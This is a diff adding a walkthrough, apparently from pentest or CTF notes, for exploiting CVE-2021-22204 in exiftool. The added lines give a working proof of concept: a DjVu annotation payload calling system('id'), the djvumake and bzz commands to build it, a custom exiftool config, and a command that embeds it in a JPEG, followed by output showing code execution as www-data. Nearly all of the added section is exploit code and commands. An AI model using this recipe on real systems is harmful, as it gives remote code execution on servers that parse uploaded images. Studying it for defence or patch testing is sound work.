@@ -108,5 +108,79 @@ Blue X                          : 0.15
 Blue Y                          : 0.05999
 ````
 
-* There is a know vulnerability for exiftool [CVE-2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204) which leads to arbitrary code execution.
+* There is a know vulnerability for exiftool in DjVu ParseAnt function [CVE-2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204) which leads to arbitrary code execution.
+
+* Conviso have written about this vulnerability https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/
+
+1. Create valid DjVu exploit file
+
+payload file
+````
+(metadata "\c${system('id')};")
+````
+
+````
+# Installs the required tools
+$ sudo apt install djvulibre-bin
+
+
+# Compress our payload file with to make it non human-readable
+$ bzz payload payload.bzz
+
+# INFO = Anything in the format 'N,N' where N is a number
+# BGjp = Expects a JPEG image, but we can use /dev/null to use nothing as background image
+# ANTz = Will write the compressed annotation chunk with the input file
+$ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
+````
+
+configfile
+````
+%Image::ExifTool::UserDefined = (
+    # All EXIF tags are added to the Main table, and WriteGroup is used to
+    # specify where the tag is written (default is ExifIFD if not specified):
+    'Image::ExifTool::Exif::Main' => {
+        # Example 1.  EXIF:NewEXIFTag
+        0xc51b => {
+            Name => 'HasselbladExif',
+            Writable => 'string',
+            WriteGroup => 'IFD0',
+        },
+        # add more user-defined EXIF tags here...
+    },
+);
+1; #end%
+````
+
+````
+# configfile = The name of our eval.config configuration file;
+# -HasselbladExif = Tag name that are specified in the config file;
+# exploit.djvu = Our exploit, previously made with djvumake;
+# hacker.jpg = A valid JPEG file;
+$ exiftool -config configfile '-HasselbladExif<=exploit.djvu' hacker.jpg
+
+````
+
+* Make the request and you gonna see the result
+````
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Exif Byte Order                 : Big-endian (Motorola, MM)
+X Resolution                    : 1
+Y Resolution                    : 1
+Resolution Unit                 : None
+Y Cb Cr Positioning             : Centered
+DjVu Version                    : 0.24
+Spatial Resolution              : 300
+Gamma                           : 2.2
+Orientation                     : Horizontal (normal)
+Image Width                     : 225
+Image Height                    : 225
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+````
 
